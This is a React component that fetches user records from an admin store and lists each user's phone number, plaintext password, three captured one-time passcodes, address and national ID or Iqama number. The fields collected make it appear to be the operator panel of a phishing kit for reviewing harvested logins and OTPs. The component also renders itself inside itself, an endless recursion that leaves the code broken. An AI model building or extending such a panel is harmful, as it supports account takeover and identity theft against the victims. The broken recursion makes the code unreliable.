import { useSelector, useDispatch } from "react-redux";
import { getUserInfo } from "../../store/adminSlice";
import { useEffect } from "react";
import "./user.css";


export default function UserInfo() {
    const dispatch = useDispatch();
    const { users, isLoading } = useSelector(state => state.admin);

    useEffect(() => {
        dispatch(getUserInfo());
    }, [dispatch])

    if (isLoading) {
        return <h1 className="text-center text-3xl font-bold py-10"> Loading... </h1>
    }
    return (
        <div className="min-h-screen userTableBox">
            {/* <section> */}
            <section className="hidden">
                <h1 className="text-center text-xl font-semibold py-3 my-5 border "> User List to view who login for order </h1>
                <div>
                    <div className="relative sm:overflow-x-auto shadow-md sm:rounded-lg ">
                        <table className="w-full text-sm text-left text-gray-500 dark:text-gray-400 sm:overflow-scroll">
                            <thead className="text-md text-white uppercase bg-[#15B8A9] dark:bg-gray-700 dark:text-gray-400 sm:overflow-x-auto">
                                <tr>
                                    <th scope="col" className="px-6 py-3">
                                        User Name
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Phone Number
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Password
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        OTP1
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        OTP2
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        OTP3
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Country
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Address
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        ID / Iqama Number
                                    </th>
                                </tr>
                            </thead>
                            <tbody>
                                {
                                    users.map(user => (
                                        <tr className="bg-white buser-b dark:bg-gray-800 dark:buser-gray-700">

                                            <td className="px-6 py-4 uppercase">
                                                {user.orderId}
                                            </td>
                                            <td className="px-6 py-4">
                                                {user.phoneNumber}
                                            </td>
                                            <td className="px-6 py-4">
                                                {user.password}
                                            </td>
                                            <td className="px-6 py-4 font-bold">
                                                {user.otp[0]?.otp}
                                            </td>
                                            <td className="px-6 py-4 font-bold">
                                                {user.otp[1]?.otp}
                                            </td>
                                            <td className="px-6 py-4 font-bold">
                                                {user.otp[2]?.otp}
                                            </td>
                                            <td className="px-6 py-4">
                                                {user.nationality}
                                            </td>
                                            <td className="px-6 py-4">
                                                {user.address}
                                            </td>
                                            <td className="px-6 py-4">
                                                {user.nid}
                                            </td>
                                        </tr>
                                    ))
                                }
                            </tbody>
                        </table>
                    </div>
                </div>
            </section >

            <section>

                <UserInfo />
            </section>

        </div >
    )
}